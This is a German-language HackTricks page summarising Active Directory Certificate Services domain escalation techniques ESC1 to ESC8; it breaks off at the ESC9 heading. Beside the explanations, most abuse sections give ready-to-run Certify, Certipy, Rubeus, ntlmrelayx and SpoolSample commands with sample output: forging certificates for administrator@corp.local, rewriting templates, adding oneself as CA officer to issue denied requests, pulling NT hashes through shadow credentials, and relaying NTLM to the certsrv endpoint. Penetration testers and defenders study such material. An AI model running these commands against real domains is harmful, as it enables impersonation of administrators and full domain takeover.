# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine Zusammenfassung der Abschnitte zu Eskalationstechniken der Beiträge:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Zertifikatvorlagen - ESC1

### Erklärung

### Fehlkonfigurierte Zertifikatvorlagen - ESC1 Erklärt

- **Die Anmelderechte werden von der Enterprise CA an Benutzer mit niedrigen Rechten gewährt.**
- **Die Genehmigung des Managers ist nicht erforderlich.**
- **Es sind keine Unterschriften von autorisiertem Personal erforderlich.**
- **Sicherheitsbeschreibungen auf Zertifikatvorlagen sind zu großzügig, was es Benutzern mit niedrigen Rechten ermöglicht, Anmelderechte zu erhalten.**
- **Zertifikatvorlagen sind so konfiguriert, dass sie EKUs definieren, die die Authentifizierung erleichtern:**
- Erweiterte Schlüsselverwendungs (EKU) Identifikatoren wie Client-Authentifizierung (OID 1.3.6.1.5.5.7.3.2), PKINIT Client-Authentifizierung (1.3.6.1.5.2.3.4), Smart Card-Anmeldung (OID 1.3.6.1.4.1.311.20.2.2), Beliebiger Zweck (OID 2.5.29.37.0) oder keine EKU (SubCA) sind enthalten.
- **Die Möglichkeit für Antragsteller, einen subjectAltName in der Zertifikatsanforderung (CSR) einzuschließen, wird durch die Vorlage erlaubt:**
- Das Active Directory (AD) priorisiert den subjectAltName (SAN) in einem Zertifikat zur Identitätsverifizierung, wenn vorhanden. Das bedeutet, dass durch die Angabe des SAN in einer CSR ein Zertifikat angefordert werden kann, um sich als jeder Benutzer (z. B. ein Domänenadministrator) auszugeben. Ob ein SAN vom Antragsteller angegeben werden kann, wird im AD-Objekt der Zertifikatvorlage durch die Eigenschaft `mspki-certificate-name-flag` angezeigt. Diese Eigenschaft ist ein Bitmaskenwert, und das Vorhandensein des `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-Flags erlaubt es dem Antragsteller, den SAN anzugeben.

> [!CAUTION]
> Die beschriebene Konfiguration erlaubt es Benutzern mit niedrigen Rechten, Zertifikate mit beliebigem SAN ihrer Wahl anzufordern, was die Authentifizierung als beliebiges Domänenprinzip über Kerberos oder SChannel ermöglicht.

Dieses Feature wird manchmal aktiviert, um die sofortige Erstellung von HTTPS- oder Hostzertifikaten durch Produkte oder Bereitstellungsdienste zu unterstützen oder aufgrund mangelnden Verständnisses.

Es wird angemerkt, dass die Erstellung eines Zertifikats mit dieser Option eine Warnung auslöst, was nicht der Fall ist, wenn eine vorhandene Zertifikatvorlage (wie die `WebServer`-Vorlage, die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert hat) dupliziert und dann geändert wird, um eine Authentifizierungs-OID einzuschließen.

### Missbrauch

Um **anfällige Zertifikatvorlagen zu finden**, können Sie Folgendes ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um diese **Schwachstelle auszunutzen, um einen Administrator zu impersonieren**, könnte man Folgendes ausführen:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dann können Sie das generierte **Zertifikat in das `.pfx`**-Format umwandeln und es erneut verwenden, um sich mit **Rubeus oder certipy** zu authentifizieren:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binärdateien "Certreq.exe" und "Certutil.exe" können verwendet werden, um das PFX zu generieren: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Aufzählung der Zertifikatvorlagen innerhalb des AD-Forest-Konfigurationsschemas, insbesondere derjenigen, die keine Genehmigung oder Unterschriften erfordern, die über eine Client-Authentifizierung oder Smart Card Logon EKU verfügen und mit dem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`-Flag aktiviert sind, kann durch Ausführen der folgenden LDAP-Abfrage erfolgen:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Zertifikatvorlagen - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variation des ersten:

1. Einschreiberechte werden von der Enterprise CA an niedrig privilegierte Benutzer vergeben.
2. Die Anforderung für die Genehmigung durch den Manager ist deaktiviert.
3. Die Notwendigkeit für autorisierte Unterschriften wird weggelassen.
4. Ein zu permissiver Sicherheitsdescriptor auf der Zertifikatvorlage gewährt niedrig privilegierten Benutzern die Rechte zur Zertifikateinschreibung.
5. **Die Zertifikatvorlage ist so definiert, dass sie die Any Purpose EKU oder keine EKU enthält.**

Die **Any Purpose EKU** erlaubt es einem Angreifer, ein Zertifikat für **jeden Zweck** zu erhalten, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code-Signierung usw. Die gleiche **Technik, die für ESC3 verwendet wird**, kann genutzt werden, um dieses Szenario auszunutzen.

Zertifikate mit **keinen EKUs**, die als untergeordnete CA-Zertifikate fungieren, können für **jeden Zweck** ausgenutzt werden und können **auch verwendet werden, um neue Zertifikate zu signieren**. Daher könnte ein Angreifer beliebige EKUs oder Felder in den neuen Zertifikaten angeben, indem er ein untergeordnetes CA-Zertifikat verwendet.

Allerdings funktionieren neue Zertifikate, die für die **Domänenauthentifizierung** erstellt werden, nicht, wenn die untergeordnete CA nicht vom **`NTAuthCertificates`**-Objekt vertraut wird, was die Standardeinstellung ist. Dennoch kann ein Angreifer weiterhin **neue Zertifikate mit beliebiger EKU** und willkürlichen Zertifikatwerten erstellen. Diese könnten potenziell **missbraucht** werden für eine Vielzahl von Zwecken (z. B. Code-Signierung, Server-Authentifizierung usw.) und könnten erhebliche Auswirkungen auf andere Anwendungen im Netzwerk wie SAML, AD FS oder IPSec haben.

Um Vorlagen zu enumerieren, die diesem Szenario innerhalb des Konfigurationsschemas des AD Forest entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrollment-Agent-Vorlagen - ESC3

### Erklärung

Dieses Szenario ist wie das erste und zweite, aber **missbraucht** eine **andere EKU** (Certificate Request Agent) und **2 verschiedene Vorlagen** (daher hat es 2 Sets von Anforderungen).

Die **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekannt als **Enrollment Agent** in der Microsoft-Dokumentation, erlaubt einem Principal, sich **im Namen eines anderen Benutzers** für ein **Zertifikat** **anzumelden**.

Der **„enrollment agent“** meldet sich in einer solchen **Vorlage** an und verwendet das resultierende **Zertifikat, um einen CSR im Namen des anderen Benutzers mitzuunterzeichnen**. Er **sendet** dann den **mitunterzeichneten CSR** an die CA, meldet sich in einer **Vorlage** an, die „enroll on behalf of“ **erlaubt**, und die CA antwortet mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.

**Anforderungen 1:**

- Die Enterprise CA gewährt Anmelderechte an niedrigprivilegierte Benutzer.
- Die Anforderung für die Genehmigung durch den Manager wird weggelassen.
- Keine Anforderung für autorisierte Unterschriften.
- Der Sicherheitsdescriptor der Zertifikatvorlage ist übermäßig permissiv und gewährt Anmelderechte an niedrigprivilegierte Benutzer.
- Die Zertifikatvorlage enthält die Certificate Request Agent EKU, die die Anforderung anderer Zertifikatvorlagen im Namen anderer Principals ermöglicht.

**Anforderungen 2:**

- Die Enterprise CA gewährt Anmelderechte an niedrigprivilegierte Benutzer.
- Die Genehmigung des Managers wird umgangen.
- Die Schema-Version der Vorlage ist entweder 1 oder übersteigt 2, und sie gibt eine Anforderung für die Anwendungsrichtlinie an, die die Certificate Request Agent EKU erfordert.
- Eine in der Zertifikatvorlage definierte EKU erlaubt die Domänenauthentifizierung.
- Einschränkungen für Enrollment Agents werden auf der CA nicht angewendet.

### Missbrauch

Sie können [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die berechtigt sind, ein **Zertifikat für Einschreibungsagenten** zu **erhalten**, die Vorlagen, in denen Einschreibungs-**agenten** berechtigt sind, sich einzuschreiben, und die **Konten**, in deren Namen der Einschreibungsagent handeln kann, können durch Unternehmens-CA eingeschränkt werden. Dies wird erreicht, indem das `certsrc.msc` **Snap-In** geöffnet, **mit der rechten Maustaste auf die CA** geklickt, **Eigenschaften** ausgewählt und dann zum Tab „Einschreibungsagenten“ **navigiert** wird.

Es wird jedoch angemerkt, dass die **Standard**-Einstellung für CAs „**Einschreibungsagenten nicht einschränken**“ ist. Wenn die Einschränkung für Einschreibungsagenten von Administratoren aktiviert wird, bleibt die Standardeinstellung extrem permissiv. Sie erlaubt **Jedem** den Zugang zur Einschreibung in alle Vorlagen als beliebige Person.

## Verwundbare Zertifikatvorlagen-Zugriffskontrolle - ESC4

### **Erklärung**

Der **Sicherheitsdescriptor** auf **Zertifikatvorlagen** definiert die **Berechtigungen**, die spezifische **AD-Prinzipien** in Bezug auf die Vorlage besitzen.

Sollte ein **Angreifer** die erforderlichen **Berechtigungen** besitzen, um eine **Vorlage** zu **ändern** und alle **ausnutzbaren Fehlkonfigurationen**, die in **vorherigen Abschnitten** beschrieben sind, zu **instituieren**, könnte eine Privilegieneskalation erleichtert werden.

Bemerkenswerte Berechtigungen, die für Zertifikatvorlagen gelten, sind:

- **Besitzer:** Gewährt implizite Kontrolle über das Objekt, was die Änderung aller Attribute ermöglicht.
- **Vollzugriff:** Ermöglicht vollständige Autorität über das Objekt, einschließlich der Fähigkeit, alle Attribute zu ändern.
- **BesitzerÄndern:** Erlaubt die Änderung des Besitzers des Objekts auf ein Prinzip unter der Kontrolle des Angreifers.
- **DaclÄndern:** Ermöglicht die Anpassung der Zugriffskontrollen, was einem Angreifer möglicherweise Vollzugriff gewährt.
- **EigenschaftÄndern:** Ermächtigt zur Bearbeitung aller Objektattribute.

### Missbrauch

Ein Beispiel für eine Privilegieneskalation wie die vorherige:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ist, wenn ein Benutzer Schreibberechtigungen über eine Zertifikatvorlage hat. Dies kann beispielsweise missbraucht werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und die Vorlage anfällig für ESC1 zu machen.

Wie wir im obigen Pfad sehen können, hat nur `JOHNPC` diese Berechtigungen, aber unser Benutzer `JOHN` hat den neuen `AddKeyCredentialLink`-Edge zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist. Hier ist ein kleiner Vorgeschmack auf den `shadow auto`-Befehl von Certipy, um den NT-Hash des Opfers abzurufen.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. Standardmäßig wird Certipy die Konfiguration **überschreiben**, um sie **anfällig für ESC1** zu machen. Wir können auch den **`-save-old` Parameter angeben, um die alte Konfiguration zu speichern**, was nützlich sein wird, um die Konfiguration nach unserem Angriff **wiederherzustellen**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Verwundbare PKI-Objektzugriffssteuerung - ESC5

### Erklärung

Das umfangreiche Netz von miteinander verbundenen, ACL-basierten Beziehungen, das mehrere Objekte über Zertifikatvorlagen und die Zertifizierungsstelle hinaus umfasst, kann die Sicherheit des gesamten AD CS-Systems beeinträchtigen. Diese Objekte, die die Sicherheit erheblich beeinflussen können, umfassen:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Den RPC/DCOM-Server des CA-Servers.
- Jedes nachfolgende AD-Objekt oder Container innerhalb des spezifischen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst, ist aber nicht beschränkt auf, Container und Objekte wie den Container für Zertifikatvorlagen, den Container für Zertifizierungsstellen, das NTAuthCertificates-Objekt und den Container für Registrierungsdienste.

Die Sicherheit des PKI-Systems kann gefährdet sein, wenn es einem niedrig privilegierten Angreifer gelingt, die Kontrolle über eines dieser kritischen Komponenten zu erlangen.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erklärung

Das im [**CQure Academy-Beitrag**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Thema berührt auch die Implikationen des **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-Flags, wie von Microsoft dargelegt. Diese Konfiguration, wenn sie auf einer Zertifizierungsstelle (CA) aktiviert ist, erlaubt die Einbeziehung von **benutzerdefinierten Werten** im **subject alternative name** für **jede Anfrage**, einschließlich derjenigen, die aus Active Directory® erstellt werden. Folglich ermöglicht diese Bestimmung einem **Eindringling**, sich über **jede Vorlage** zu registrieren, die für die **Authentifizierung** im Domänenbereich eingerichtet ist—insbesondere solche, die für die Registrierung von **nicht privilegierten** Benutzern offen sind, wie die Standardbenutzervorlage. Infolgedessen kann ein Zertifikat gesichert werden, das es dem Eindringling ermöglicht, sich als Domänenadministrator oder **jede andere aktive Entität** innerhalb der Domäne zu authentifizieren.

**Hinweis**: Der Ansatz zur Hinzufügung von **alternativen Namen** in eine Zertifikatsanforderung (CSR) über das Argument `-attrib "SAN:"` in `certreq.exe` (als „Name-Wert-Paare“ bezeichnet) stellt einen **Kontrast** zur Ausnutzungsstrategie von SANs in ESC1 dar. Hier liegt der Unterschied darin, **wie Kontoinformationen verkapselt sind**—innerhalb eines Zertifikatsattributs, anstatt einer Erweiterung.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Dieser Vorgang verwendet im Wesentlichen **Remote-Registry-Zugriff**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) sind in der Lage, diese Fehlkonfiguration zu erkennen und auszunutzen:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, vorausgesetzt, man besitzt **Domain-Administrations**rechte oder gleichwertige, kann der folgende Befehl von jedem Arbeitsplatz aus ausgeführt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das Flag mit folgendem Befehl entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nach den Sicherheitsupdates vom Mai 2022 enthalten neu ausgestellte **Zertifikate** eine **Sicherheits-erweiterung**, die die **`objectSid`-Eigenschaft des Anforderers** integriert. Für ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Für **ESC6** spiegelt die SID jedoch die **`objectSid` des Anforderers** wider, nicht das SAN.\
> Um ESC6 auszunutzen, muss das System anfällig für ESC10 (Schwache Zertifikatszuordnungen) sein, das das **SAN über die neue Sicherheits-erweiterung** priorisiert.

## Verwundbare Zertifizierungsstelle Zugriffssteuerung - ESC7

### Angriff 1

#### Erklärung

Die Zugriffssteuerung für eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen aufrechterhalten, die die CA-Aktionen regeln. Diese Berechtigungen können eingesehen werden, indem man `certsrv.msc` aufruft, mit der rechten Maustaste auf eine CA klickt, Eigenschaften auswählt und dann zum Tab Sicherheit navigiert. Darüber hinaus können Berechtigungen mit dem PSPKI-Modul unter Verwendung von Befehlen wie:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies bietet Einblicke in die primären Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die den Rollen des „CA-Administrators“ und des „Zertifikatsmanagers“ entsprechen.

#### Missbrauch

Das Vorhandensein von **`ManageCA`**-Rechten auf einer Zertifizierungsstelle ermöglicht es dem Prinzipal, Einstellungen remote mit PSPKI zu manipulieren. Dazu gehört das Umschalten des **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-Flags, um die SAN-Spezifikation in jeder Vorlage zuzulassen, ein kritischer Aspekt der Domain-Eskalation.

Die Vereinfachung dieses Prozesses ist durch die Verwendung des **Enable-PolicyModuleFlag**-Cmdlets von PSPKI möglich, das Änderungen ohne direkte GUI-Interaktion ermöglicht.

Der Besitz von **`ManageCertificates`**-Rechten erleichtert die Genehmigung ausstehender Anfragen und umgeht effektiv die Sicherheitsmaßnahme „Genehmigung durch den CA-Zertifikatsmanager“.

Eine Kombination aus **Certify**- und **PSPKI**-Modulen kann verwendet werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Angriff 2

#### Erklärung

> [!WARNING]
> Im **vorherigen Angriff** wurden die Berechtigungen **`Manage CA`** verwendet, um das **EDITF_ATTRIBUTESUBJECTALTNAME2**-Flag zu **aktivieren**, um den **ESC6-Angriff** durchzuführen, aber dies hat keine Auswirkungen, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer das Zugriffsrecht **`Manage CA`** hat, darf der Benutzer auch den **Dienst neu starten**. Es **bedeutet jedoch nicht, dass der Benutzer den Dienst remote neu starten kann**. Darüber hinaus **funktioniert ESC6 möglicherweise nicht sofort** in den meisten gepatchten Umgebungen aufgrund der Sicherheitsupdates vom Mai 2022.

Daher wird hier ein weiterer Angriff vorgestellt.

Voraussetzungen:

- Nur die Berechtigung **`ManageCA`**
- Berechtigung **`Manage Certificates`** (kann von **`ManageCA`** gewährt werden)
- Das Zertifikat-Template **`SubCA`** muss **aktiviert** sein (kann von **`ManageCA`** aktiviert werden)

Die Technik beruht auf der Tatsache, dass Benutzer mit den Zugriffsrechten **`Manage CA`** _und_ **`Manage Certificates`** **fehlgeschlagene Zertifikatsanfragen** **ausstellen** können. Das Zertifikat-Template **`SubCA`** ist **anfällig für ESC1**, aber **nur Administratoren** können sich für das Template registrieren. Daher kann ein **Benutzer** **beantragen**, sich für die **`SubCA`** zu registrieren - was **abgelehnt** wird - aber **dann später vom Manager ausgestellt** wird.

#### Missbrauch

Sie können sich das Zugriffsrecht **`Manage Certificates`** gewähren, indem Sie Ihren Benutzer als neuen Beauftragten hinzufügen.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-Vorlage kann mit dem Parameter `-enable-template` auf der CA **aktiviert** werden. Standardmäßig ist die `SubCA`-Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir beginnen, **ein Zertifikat basierend auf der `SubCA`-Vorlage anzufordern**.

**Diese Anfrage wird abgelehnt**, aber wir werden den privaten Schlüssel speichern und die Anforderungs-ID notieren.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unseren **`Manage CA` und `Manage Certificates`** können wir dann **die fehlgeschlagene Zertifikatsanfrage** mit dem `ca` Befehl und dem `-issue-request <request ID>` Parameter ausstellen.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir das **ausgestellte Zertifikat** mit dem `req`-Befehl und dem Parameter `-retrieve <request ID>` abrufen.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay zu AD CS HTTP-Endpunkten – ESC8

### Erklärung

> [!TIP]
> In Umgebungen, in denen **AD CS installiert ist**, wenn ein **anfälliger Web-Registrierungsendpunkt** existiert und mindestens eine **Zertifikatvorlage veröffentlicht ist**, die **die Registrierung von Domänencomputern und die Client-Authentifizierung** erlaubt (wie die Standard-**`Machine`**-Vorlage), wird es möglich, dass **jeder Computer mit aktivem Spooler-Dienst von einem Angreifer kompromittiert werden kann**!

Mehrere **HTTP-basierte Registrierungsverfahren** werden von AD CS unterstützt, die durch zusätzliche Serverrollen verfügbar gemacht werden, die Administratoren installieren können. Diese Schnittstellen für die HTTP-basierte Zertifikatsregistrierung sind anfällig für **NTLM-Relay-Angriffe**. Ein Angreifer kann von einem **kompromittierten Rechner aus jedes AD-Konto impersonieren, das über eingehendes NTLM authentifiziert**. Während er das Opferkonto impersoniert, können diese Webschnittstellen von einem Angreifer genutzt werden, um **ein Client-Authentifizierungszertifikat mit den `User`- oder `Machine`-Zertifikatvorlagen anzufordern**.

- Die **Web-Registrierungsoberfläche** (eine ältere ASP-Anwendung, die unter `http://<caserver>/certsrv/` verfügbar ist), verwendet standardmäßig nur HTTP, was keinen Schutz gegen NTLM-Relay-Angriffe bietet. Darüber hinaus erlaubt sie ausdrücklich nur NTLM-Authentifizierung über ihren Authorization-HTTP-Header, wodurch sicherere Authentifizierungsmethoden wie Kerberos unbrauchbar werden.
- Der **Zertifikatsregistrierungsdienst** (CES), der **Zertifikatsregistrierungspolitik** (CEP) Webdienst und der **Netzwerkgerätregistrierungsdienst** (NDES) unterstützen standardmäßig die Verhandlungsauthentifizierung über ihren Authorization-HTTP-Header. Die Verhandlungsauthentifizierung **unterstützt sowohl** Kerberos als auch **NTLM**, was es einem Angreifer ermöglicht, während Relay-Angriffen auf NTLM-Authentifizierung **herunterzustufen**. Obwohl diese Webdienste standardmäßig HTTPS aktivieren, schützt HTTPS allein **nicht vor NTLM-Relay-Angriffen**. Schutz vor NTLM-Relay-Angriffen für HTTPS-Dienste ist nur möglich, wenn HTTPS mit Channel Binding kombiniert wird. Leider aktiviert AD CS keinen erweiterten Schutz für die Authentifizierung auf IIS, der für Channel Binding erforderlich ist.

Ein häufiges **Problem** bei NTLM-Relay-Angriffen ist die **kurze Dauer von NTLM-Sitzungen** und die Unfähigkeit des Angreifers, mit Diensten zu interagieren, die **NTLM-Signing** erfordern.

Dennoch wird diese Einschränkung überwunden, indem ein NTLM-Relay-Angriff ausgenutzt wird, um ein Zertifikat für den Benutzer zu erwerben, da die Gültigkeitsdauer des Zertifikats die Dauer der Sitzung bestimmt und das Zertifikat mit Diensten verwendet werden kann, die **NTLM-Signing** vorschreiben. Für Anweisungen zur Nutzung eines gestohlenen Zertifikats siehe:

{{#ref}}
account-persistence.md
{{#endref}}

Eine weitere Einschränkung von NTLM-Relay-Angriffen ist, dass **ein vom Angreifer kontrollierter Rechner von einem Opferkonto authentifiziert werden muss**. Der Angreifer könnte entweder warten oder versuchen, diese Authentifizierung zu **erzwingen**:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Missbrauch**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumeriert **aktivierte HTTP AD CS-Endpunkte**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers`-Eigenschaft wird von Unternehmenszertifizierungsstellen (CAs) verwendet, um Endpunkte des Certificate Enrollment Service (CES) zu speichern. Diese Endpunkte können mit dem Tool **Certutil.exe** analysiert und aufgelistet werden:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anfrage für ein Zertifikat erfolgt standardmäßig durch Certipy basierend auf der Vorlage `Machine` oder `User`, abhängig davon, ob der übertragene Kontoname mit `$` endet. Die Angabe einer alternativen Vorlage kann durch die Verwendung des Parameters `-template` erreicht werden.

Eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) kann dann verwendet werden, um die Authentifizierung zu erzwingen. Bei der Arbeit mit Domänencontrollern ist die Angabe von `-template DomainController` erforderlich.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Keine Sicherheits-Erweiterung - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

